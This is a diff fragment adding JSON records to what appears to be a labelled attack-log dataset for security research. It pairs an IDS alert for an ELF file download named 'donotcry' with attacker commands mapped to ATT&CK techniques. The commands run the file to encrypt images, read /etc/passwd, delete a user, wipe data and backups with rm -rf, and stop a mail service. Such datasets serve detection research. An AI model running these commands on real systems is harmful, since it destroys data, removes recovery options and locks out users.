+            "suricata"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "inetfw",
+          "ip": "192.168.100.254"
+        },
+        "manager": {
+          "name": "wazuh"
+        },
+        "id": "1765536438.1073108",
+        "decoder": {
+          "name": "json"
+        },
+        "data": {
+          "timestamp": "2025-12-12T10:47:17.537196+0000",
+          "flow_id": "1010880459641998.000000",
+          "in_iface": "ens4",
+          "event_type": "alert",
+          "src_ip": "192.42.1.174",
+          "src_port": "80",
+          "dest_ip": "192.168.100.23",
+          "dest_port": "48342",
+          "proto": "TCP",
+          "metadata": {
+            "flowbits": [
+              "http.dottedquadhost",
+              "ET.ELFDownload"
+            ]
+          },
+          "community_id": "1:OuR6BFoXGdDG4c1m5KuKmJC5z+E=",
+          "tx_id": "0",
+          "alert": {
+            "action": "allowed",
+            "gid": "1",
+            "signature_id": "2019240",
+            "rev": "14",
+            "signature": "ET POLICY Executable and linking format (ELF) file download Over HTTP",
+            "category": "Potential Corporate Privacy Violation",
+            "severity": "1",
+            "metadata": {
+              "confidence": [
+                "High"
+              ],
+              "created_at": [
+                "2014_09_25"
+              ],
+              "signature_severity": [
+                "Informational"
+              ],
+              "updated_at": [
+                "2023_04_12"
+              ]
+            }
+          },
+          "http": {
+            "hostname": "192.42.1.174",
+            "url": "/donotcry",
+            "http_user_agent": "curl/7.88.1",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": "200",
+            "length": "41489"
+          },
+          "files": [
+            {
+              "filename": "/donotcry",
+              "sid": [],
+              "gaps": false,
+              "state": "UNKNOWN",
+              "stored": false,
+              "size": 41489,
+              "tx_id": 0
+            }
+          ],
+          "app_proto": "http",
+          "flow": {
+            "pkts_toserver": "8",
+            "pkts_toclient": "36",
+            "bytes_toserver": "620",
+            "bytes_toclient": "49644",
+            "start": "2025-12-12T10:47:17.529550+0000"
+          }
+        },
+        "location": "/var/log/suricata/eve.json"
+      }
+    },
+    {
+      "raw_id": "EVT-1041",
+      "seq": "3_ssh_apt-26",
+      "timestamp": "2025-12-12T10:47:34.463304",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-26/attacker/logs/attackmate.json",
+      "command": "/lib64/ld-linux-x86-64.so.2 /opt/donotcry encrypt /media/data/Images",
+      "tactics": "Impact",
+      "techniques": "T1486,T1565.001",
+      "technique_name": "Data Encrypted for Impact, Data Manipulation: Stored Data Manipulation",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:47:34.463304",
+        "type": "msf-session",
+        "cmd": "/lib64/ld-linux-x86-64.so.2 /opt/donotcry encrypt /media/data/Images",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1486,T1565.001",
+            "tactics": "Impact",
+            "technique_name": "Data Encrypted for Impact, Data Manipulation: Stored Data Manipulation"
+          },
+          "stdapi": false,
+          "write": false,
+          "read": false,
+          "session": "movement",
+          "end_str": null
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1042",
+      "seq": "3_ssh_apt-27",
+      "timestamp": "2025-12-12T10:47:50.850467",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-27/attacker/logs/attackmate.json",
+      "command": "find /media/data/Images",
+      "tactics": "Discovery",
+      "techniques": "T1018",
+      "technique_name": "Remote System Discovery",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:47:50.850467",
+        "type": "msf-session",
+        "cmd": "find /media/data/Images",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1018",
+            "tactics": "Discovery",
+            "technique_name": "Remote System Discovery"
+          },
+          "stdapi": false,
+          "write": false,
+          "read": false,
+          "session": "movement",
+          "end_str": null
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1043",
+      "seq": "3_ssh_apt-28",
+      "timestamp": "2025-12-12T10:48:07.171055",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-28/attacker/logs/attackmate.json",
+      "command": "cat /etc/passwd",
+      "tactics": "Discovery",
+      "techniques": "T1087.001",
+      "technique_name": "Account Discovery: Local Account",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:48:07.171055",
+        "type": "msf-session",
+        "cmd": "cat /etc/passwd",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1087.001",
+            "tactics": "Discovery",
+            "technique_name": "Account Discovery: Local Account"
+          },
+          "stdapi": false,
+          "write": false,
+          "read": false,
+          "session": "movement",
+          "end_str": null
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1044",
+      "seq": "3_ssh_apt-29",
+      "timestamp": "2025-12-12T10:48:23.359680",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-29/attacker/logs/attackmate.json",
+      "command": "userdel -f john",
+      "tactics": "Impact",
+      "techniques": "T1531",
+      "technique_name": "Account Access Removal",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:48:23.359680",
+        "type": "msf-session",
+        "cmd": "userdel -f john",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1531",
+            "tactics": "Impact",
+            "technique_name": "Account Access Removal"
+          },
+          "stdapi": false,
+          "write": false,
+          "read": false,
+          "session": "movement",
+          "end_str": null
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1045",
+      "seq": "3_ssh_apt-30",
+      "timestamp": "2025-12-12T10:48:39.724594",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-30/attacker/logs/attackmate.json",
+      "command": "rm -rf /media/data/*",
+      "tactics": "Impact",
+      "techniques": "T1485",
+      "technique_name": "Data Destruction",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:48:39.724594",
+        "type": "msf-session",
+        "cmd": "rm -rf /media/data/*",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1485",
+            "tactics": "Impact",
+            "technique_name": "Data Destruction"
+          },
+          "stdapi": false,
+          "write": false,
+          "read": false,
+          "session": "movement",
+          "end_str": null
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1046",
+      "seq": "3_ssh_apt-31",
+      "timestamp": "2025-12-12T10:48:56.092586",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-31/attacker/logs/attackmate.json",
+      "command": "rm -rf /var/backups/*",
+      "tactics": "Impact",
+      "techniques": "T1490",
+      "technique_name": "Inhibit System Recovery",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:48:56.092586",
+        "type": "msf-session",
+        "cmd": "rm -rf /var/backups/*",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1490",
+            "tactics": "Impact",
+            "technique_name": "Inhibit System Recovery"
+          },
+          "stdapi": false,
+          "write": false,
+          "read": false,
+          "session": "movement",
+          "end_str": null
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1047",
+      "seq": "3_ssh_apt-32",
+      "timestamp": "2025-12-12T10:49:12.468733",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-32/attacker/logs/attackmate.json",
+      "command": "systemctl stop exim4.service",
+      "tactics": "Impact",
+      "techniques": "T1489",
+      "technique_name": "Service Stop",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:49:12.468733",
+        "type": "msf-session",
+        "cmd": "systemctl stop exim4.service",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1489",
+            "tactics": "Impact",
+            "technique_name": "Service Stop"
+          },
+          "stdapi": false,
+          "write": false,
+          "read": false,
+          "session": "movement",
+          "end_str": null
+        }
+      }
+    }
+  ]
+}
